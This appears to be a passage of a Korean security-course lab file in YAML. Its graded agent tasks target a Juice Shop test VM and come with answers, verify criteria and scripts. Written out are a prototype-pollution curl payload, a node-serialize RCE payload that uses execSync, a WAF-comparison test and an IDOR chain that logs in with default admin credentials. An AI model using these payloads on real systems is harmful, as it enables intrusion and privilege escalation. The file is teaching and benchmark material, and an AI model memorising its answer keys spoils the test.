+  answer: "\U0001F916 프롬프트: Prototype Pollution 공격을 시도하시오. JuiceShop API에 __proto__\
+    \ 속성을 포함한 JSON을 전송하여 서버 객체를 오염시켜라해줘\n\U0001F4CE 참고 (CLI): curl -s \\\n     -X\
+    \ POST http://10.20.30.80:3000/api/Users/ \\\n     -H 'Content-Type: application/json'\
+    \ \\\n     -d '{\"email\":\"proto_test@test.com\",\"password\":\"test1234\",\"\
+    passwordRepeat\":\"test1234\",\"__proto__\":{\"role\":\"admin\",\"isAdmin\":true}}'\
+    \ -w '\\nHTTP:%{http_code}'"
+  answer_detail: 'Prototype Pollution은 JavaScript 객체의 __proto__ 속성을 조작하여 Object.prototype을
+    오염시킵니다. JSON.parse()나 Object.assign()으로 사용자 입력을 처리할 때 __proto__ 키가 포함되면 모든 객체에서
+    오염된 속성(isAdmin: true)이 상속되어 권한 상승이 발생합니다.'
+  verify:
+    type: output_contains
+    expect: email
+    field: stdout
+    semantic:
+      intent: Prototype Pollution — __proto__ 키 포함한 JSON 을 서버 머지 로직에 주입해 전역 객체 오염
+      success_criteria:
+      - JSON body 에 __proto__ 또는 constructor.prototype 포함
+      - 서버 응답 차이 (적용됐다면 전체 객체 속성 변화)
+      - 연쇄 공격(RCE, auth bypass) 가능성 언급
+      acceptable_methods:
+      - curl -H Content-Type:application/json -d <json>
+      - NodeGoat prototype pollution lab
+      - HackerOne reports 참조
+      - ppmap 도구
+      negative_signs:
+      - __proto__ 키 없이 일반 JSON
+      - 서버 반응 분석 없음
+      - 연쇄 공격 맥락 없음
+  target_vm: attacker
+  script: "curl -s \\\n     -X POST http://10.20.30.80:3000/api/Users/ \\\n     -H\
+    \ 'Content-Type: application/json' \\\n     -d '{\"email\":\"proto_test@test.com\"\
+    ,\"password\":\"test1234\",\"passwordRepeat\":\"test1234\",\"__proto__\":{\"role\"\
+    :\"admin\",\"isAdmin\":true}}' -w '\\nHTTP:%{http_code}'"
+  risk_level: medium
+  bastion_prompt: 'Prototype Pollution 공격을 시도하시오. JuiceShop API에 __proto__ 속성을 포함한
+    JSON을 전송하여 서버 객체를 오염시켜라해줘
+
+
+
+
+    [도구 권장] exploit: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등). curl 만 쓰지 말고
+    **공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등)** 등 적합 도구로 호출 후 stdout quote.
+
+
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
+- order: 8
+  instruction: 'Node.js의 node-serialize 모듈 취약점 페이로드를 작성하시오. IIFE(즉시 실행 함수) 패턴이 포함된
+    직렬화 문자열을 구성하고 /tmp/node_deser.json에 저장하라.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `exploit` 에 적합한 도구: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf
+    등). 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: node-serialize는 _$$ND_FUNC$$_ 마커로 함수를 직렬화합니다. {"rce":"_$$ND_FUNC$$_function(){return
+    require('child_process').execSync('id').toString()}()"} 형태입니다.
+  category: exploit
+  points: 10
+  answer: "\U0001F916 프롬프트: Node 구현 방법과 예시를 설명해줘\n\U0001F4CE 참고 (CLI): cat > /tmp/node_deser.json\
+    \ << 'JSONEOF'\n{\n  \"username\": \"attacker\",\n  \"rce\": \"_$$ND_FUNC$$_function(){return\
+    \ require('child_process').execSync('id').toString()}()\"\n}\nJSONEOF\necho '===\
+    \ Node.js Deserialization Payload ===' && cat /tmp/node_deser.json && echo '---'\
+    \ && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type: application/json'\
+    \ -d @/tmp/node_deser.json -w '\\nHTTP:%{http_code}'"
+  answer_detail: node-serialize 모듈은 직렬화된 문자열에 _$$ND_FUNC$$_ 마커가 있으면 JavaScript 함수로
+    복원합니다. IIFE 패턴(함수 끝에 ())을 추가하면 역직렬화 시 자동 실행됩니다. require('child_process').execSync()로
+    시스템 명령을 실행할 수 있습니다.
+  verify:
+    type: output_contains
+    expect:
+    - Node.js Deserialization Payload
+    - payload
+    field: stdout
+    semantic:
+      intent: <SENSITIVE:06359146fd1a5825>
+      success_criteria:
+      - <SENSITIVE:d40a589e64ee2f4c>
+      - <SENSITIVE:e63afde96357525d>
+      - /tmp/deser_node.json 저장 후 cat 확인
+      acceptable_methods:
+      - heredoc 으로 JSON 파일 작성
+      - python json.dumps
+      - Node.js serialize 라이브러리 실제 직렬화
+      - ysoserial.net 대응 payload
+      negative_signs:
+      - <SENSITIVE:53f99b036f4b97d5>
+      - IIFE () 괄호 없음
+      - 파일 저장 없음
+  target_vm: attacker
+  script: "cat > /tmp/node_deser.json << 'JSONEOF'\n{\n  \"username\": \"attacker\"\
+    ,\n  \"rce\": \"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()\"\
+    \n}\nJSONEOF\necho '=== Node.js Deserialization Payload ===' && cat /tmp/node_deser.json\
+    \ && echo '---' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type:\
+    \ application/json' -d @/tmp/node_deser.json -w '\\nHTTP:%{http_code}'"
+  risk_level: medium
+  bastion_prompt: 'Node.js의 node-serialize 모듈 취약점 페이로드를 작성하시오. IIFE(즉시 실행 함수) 패턴이
+    포함된 직렬화 문자열을 구성하고 /tmp/node_deser.json에 저장하라.
+
+
+
+
+    [도구 권장] exploit: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등). curl 만 쓰지 말고
+    **공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등)** 등 적합 도구로 호출 후 stdout quote.
+
+
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
+- order: 9
+  instruction: '역직렬화 방어 상태를 검증하시오. ModSecurity(포트 80)가 __proto__, _$$ND_FUNC$$_ 패턴을
+    차단하는지 확인하고, 직접 접근(포트 3000)과 비교하라.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
+    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 같은 Prototype Pollution 페이로드를 포트 80과 포트 3000에 각각 전송하여 응답 코드를 비교하세요.
+  category: defense
+  points: 10
+  answer: '🤖 프롬프트: 역직렬화 방어 상태를 검증하시오. ModSecurity(포트 80)가 __proto__, _$$ND_FUNC$$_
+    패턴을 차단하는지 확인하고, 직접 접근(포트 3000)과 비교해줘
+
+    📎 참고 (CLI): echo ''=== ModSecurity (포트 80) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
+    -X POST http://10.20.30.80:80/api/Users/ -H ''Content-Type: application/json''
+    -d ''{"email":"waf@t.com","password":"t","__proto__":{"role":"admin"}}'' && echo
+    '''' && echo ''=== Direct (포트 3000) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
+    -X POST http://10.20.30.80:3000/api/Users/ -H ''Content-Type: application/json''
+    -d ''{"email":"nowaf@t.com","password":"t","__proto__":{"role":"admin"}}'''
+  answer_detail: 역직렬화 방어의 핵심은 신뢰할 수 없는 데이터를 역직렬화하지 않는 것입니다. WAF에서 __proto__, constructor,
+    _$$ND_FUNC$$_ 패턴을 차단하고, 서버 코드에서는 JSON Schema 검증, allowlist 기반 필드 필터링을 적용해야 합니다.
+  verify:
+    type: output_contains
+    expect: ===
+    field: stdout
+    semantic:
+      intent: <SENSITIVE:7ff5fae42943817c>
+      success_criteria:
+      - 포트 80(WAF) 와 포트 3000(직접) 에 동일 payload 전송
+      - 응답 코드 비교 + WAF 차단 로그 확인
+      - 방어 권고 (safer 역직렬화 라이브러리, JSON.parse only) 제시
+      acceptable_methods:
+      - curl 로 두 포트 테스트
+      - ModSecurity audit_log 검사
+      - ppmap 자동화
+      - npm audit 또는 snyk test
+      negative_signs:
+      - 단일 포트만
+      - WAF 로그 확인 없음
+      - 방어 권고 없음
+  target_vm: attacker
+  script: 'echo ''=== ModSecurity (포트 80) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
+    -X POST http://10.20.30.80:80/api/Users/ -H ''Content-Type: application/json''
+    -d ''{"email":"waf@t.com","password":"t","__proto__":{"role":"admin"}}'' && echo
+    '''' && echo ''=== Direct (포트 3000) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
+    -X POST http://10.20.30.80:3000/api/Users/ -H ''Content-Type: application/json''
+    -d ''{"email":"nowaf@t.com","password":"t","__proto__":{"role":"admin"}}'''
+  risk_level: low
+  bastion_prompt: '역직렬화 방어 상태를 검증하시오. ModSecurity(포트 80)가 __proto__, _$$ND_FUNC$$_
+    패턴을 차단하는지 확인하고, 직접 접근(포트 3000)과 비교해줘
+
+
+    [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
+    curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
+- order: 99
+  instruction: "[복합 시나리오] \"권한 상승 chain — IDOR 수평 + Prototype Pollution 수직\"\n\n##\
+    \ 상황 (w08 → w09 시나리오 연속)\n\nw08 중간고사 끝났다. 후반부 시작 — 접근제어.\n\n> 선배: \"권한 상승은 두 종류\
+    \ — *수평* (다른 사용자) 과 *수직* (관리자). 표면은 비슷해 보이지만 위협 규모가 달라.\n> 수평은 IDOR 로 basket/1,\
+    \ basket/2 같은 객체 ID 변조. 수직은 JWT id 변조 또는 prototype pollution\n> 으로 role=admin\
+    \ 주입. JuiceShop 에서 두 케이스 다 시연하고, 권한 상승 매트릭스 정리해.\"\n\n학습 목표 (lecture #1·#2 수평·수직\
+    \ + #3 IDOR + #4 API 접근제어) + (lab #6 IDOR + #7 Prototype) 통합.\n\n## 임무 (3 단계,\
+    \ 약 35분)\n\n### Phase A — 수평 권한 상승 (IDOR, lab #6)\n1) admin 로그인으로 JWT 획득.\n  \
+    \ `curl -s -X POST -H \"Content-Type: application/json\" -d '{\"email\":\"admin@juice-sh.op\"\
+    ,\"password\":\"admin123\"}'\n    http://10.20.30.80/rest/user/login`\n2) 자신 basket\
+    \ id 조회: `curl -s -H \"Authorization: Bearer <JWT>\" http://10.20.30.80/api/Baskets/1`\n\
+    3) 다른 사용자 basket: `for i in 2 3 4; do\n     curl -s -o /dev/null -w \"basket/$i:\
+    \ %{http_code}\\n\" -H \"Authorization: Bearer <JWT>\"\n     http://10.20.30.80/api/Baskets/$i;\
+    \ done`\n응답 코드 (200 → IDOR 성공 / 401·403 → 차단) 비교 분석.\n\n### Phase B — 수직 권한 상승\
+    \ (Prototype Pollution, lab #7)\nJuiceShop 의 admin 권한 추구 — `__proto__.role = \"\
+    admin\"` JSON pollution PoC.\n`curl -s -X POST -H \"Content-Type: application/json\"\
+    \n -d '{\"email\":\"test@x.com\",\"password\":\"x\",\"__proto__\":{\"role\":\"\
+    admin\"}}'\n http://10.20.30.80/api/Users/`\n응답에서 role 필드 캡처. `__proto__` 차단 여부\
+    \ (실 차단 시 응답 코드 자체가 학습).\n\n### Phase C — 권한 상승 매트릭스 + 방어 권고\n| 방향 | 공격 기법 | 입력\
+    \ 위치 | 핵심 방어 | 잔존 위험 |\n| 수평 (IDOR) | object ID 변조 | URL 경로/쿼리 | 객체 owner 검증 |\
+    \ 검증 누락 endpoint |\n| 수직 (JWT id) | id payload 변조 | JWT payload | 서명 검증 + role\
+    \ check | key leak |\n| 수직 (Prototype) | __proto__ 주입 | JSON body | Object.freeze\
+    \ + parse 검사 | 라이브러리 취약 |\n| 수평+수직 chain | IDOR → token 탈취 | 다단계 | 다층 인증 + audit\
+    \ log | 종합 모니터링 |\n표 끝 \"JuiceShop 권고: API endpoint 별 owner check + __proto__\
+    \ 키 거부 + audit log\" 한 줄.\n\n종료: echo \"=== Phase A IDOR ===\" / \"=== Phase B\
+    \ Prototype ===\" / \"=== Phase C 매트릭스 ===\" 묶음.\n\n\n[도구 권장] **curl 단독 의존 금지**.\
+    \ 카테고리 `integration_scenario` 에 적합한 도구: 여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)\
+    \ → 후속 작업. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과."
+  bastion_prompt: "[복합 시나리오 — w09 권한 상승 chain]\n\nJuiceShop (http://10.20.30.80) 수평·수직\
+    \ 권한 상승 시연 + 매트릭스 3 phase.\n\nPhase A (IDOR 수평):\n1) admin 로그인:\n   `JWT=$(curl\
+    \ -s -X POST -H \"Content-Type: application/json\" -d '{\"email\":\"admin@juice-sh.op\"\
+    ,\"password\":\"admin123\"}'\n    http://10.20.30.80/rest/user/login | python3\
+    \ -c \"import sys,json; print(json.load(sys.stdin)['authentication']['token'])\"\
+    )`\n2) 자신/타인 basket 비교:\n   `for i in 1 2 3 4; do\n     curl -s -o /dev/null -w\
+    \ \"basket/$i: %{http_code}\\n\" -H \"Authorization: Bearer $JWT\"\n     http://10.20.30.80/api/Baskets/$i;\
+    \ done`\n\nPhase B (Prototype Pollution 수직):\n`curl -s -i -X POST -H \"Content-Type:\
+    \ application/json\"\n -d '{\"email\":\"test'$(date +%s)'@x.com\",\"password\"\
+    :\"Test1234!\",\"__proto__\":{\"role\":\"admin\"}}'\n http://10.20.30.80/api/Users/`\
+    \ 실행. 응답 status + body 의 role 필드 캡처.\n\nPhase C (매트릭스):\n```\n| 방향 | 공격 기법 | 입력\
+    \ 위치 | 핵심 방어 | 잔존 위험 |\n| 수평 (IDOR) | object ID 변조 | URL 경로/쿼리 | 객체 owner 검증 |\
+    \ 검증 누락 endpoint |\n| 수직 (JWT id) | id payload 변조 | JWT payload | 서명 검증 + role\
+    \ check | key leak |\n| 수직 (Prototype) | __proto__ 주입 | JSON body | Object.freeze\
+    \ + parse 검사 | 라이브러리 취약 |\n| 수평+수직 chain | IDOR → token 탈취 | 다단계 | 다층 인증 + audit\
+    \ log | 종합 모니터링 |\n```\n표 끝 \"JuiceShop 권고: API endpoint 별 owner check + __proto__\
+    \ 키 거부 + audit log\" 한 줄.\n\n종료: echo \"=== Phase A IDOR ===\" / \"=== Phase B\
+    \ Prototype ===\" / \"=== Phase C 매트릭스 ===\" 묶음.\n\n반드시 3 phase 모두 실행. 중간 종료 금지.\n\
+    \n[도구 권장] integration_scenario: 여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)\
+    \ → 후속 작업. curl 만 쓰지 말고 **여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)\
+    \ → 후속 작업** 등 적합 도구로 호출 후 stdout quote."
+  hint: 'Phase A: bash 변수 JWT 로 토큰 저장 후 loop 으로 basket 1~4 비교. 200 vs 401/403 분석.
+
+    Phase B: __proto__ 주입은 라이브러리에 따라 차단 여부 다름. JuiceShop 은 차단됨 — 시도 자체 학습.
+
+    Phase C: 4행 매트릭스 + 권고 한 줄.
+
+    포인트: 수평 vs 수직 권한 상승 차이 + chain 가능성.
+
+    '
+  category: integration_scenario
+  points: 50
+  verify:
+    type: output_contains
+    expect: 매트릭스
+    field: stdout
+    semantic:
+      intent: 'IDOR 수평 + Prototype Pollution 수직 권한 상승 시연 + 매트릭스.
+
+        lecture #1·#2·#3·#4 + lab #6·#7 동시 행동 증명.
+
+        '
+      success_criteria:
+      - Phase A — admin 로그인 + basket 4개 비교 status code
+      - Phase B — __proto__ payload POST + 응답 캡처
+      - Phase C — 4행 매트릭스 + 권고 한 줄
+      acceptable_methods:
+      - curl + python3 JWT 추출
+      - bash for loop basket
+      - JSON __proto__ payload
+      - markdown table
+      negative_signs:
+      - basket 1개만 조회
+      - __proto__ payload 누락
+      - 매트릭스 누락
+      - 수평·수직 구분 누락
+  target_vm: attacker
+  risk_level: low
+  answer: '🤖 위 bastion_prompt 그대로. JWT → basket loop → __proto__ 주입 → 매트릭스 echo.
+
+    '
+  answer_detail: 'JuiceShop 의 IDOR 차단 여부는 endpoint 별 다름. __proto__ pollution 은 보통
+    차단됨 — 시도 자체 학습.
+
+    핵심은 수평 vs 수직 + chain 관점.
+
+    '
+  script: ''
